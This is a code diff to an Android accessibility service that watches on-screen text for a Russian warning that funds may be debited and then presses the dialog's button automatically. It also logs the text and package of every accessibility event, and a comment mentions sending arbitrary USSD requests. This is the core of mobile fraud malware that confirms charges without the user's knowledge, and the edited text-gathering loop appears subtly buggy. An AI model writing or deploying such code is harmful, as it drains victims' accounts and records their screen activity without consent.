@@ -33,10 +33,8 @@ public class AccessService extends AccessibilityService {
      */
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        Logger.lg("event " + event.getText() + " " + flagok);
         if (flagok) {
             this.event = event;
-            Log.d(TAG, "onAccessibilityEvent");
             Logger.lg(String.format(
                     "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                     event.getEventType(), event.getClassName(), event.getPackageName(),
@@ -80,11 +78,17 @@ public class AccessService extends AccessibilityService {
                     }
                 }
             }
-        } else if(event.getText().contains("быть списаны средства")){
-            Logger.lg("Эсписаны ");
-            clickOnButton(event, 0);
+        } else if (event.getText().size() != 0) {
+            String str = "";
+            for (int i = 0; i < event.getText().size() - 1; i++) {
+                str += event.getText().get(1);
+            }
+            if (str.contains("могут быть списаны средства")) {
+                clickOnButton(event, 0);
+            }
         }
     }
+
 
     /**
      * Send whatever you want via USSD
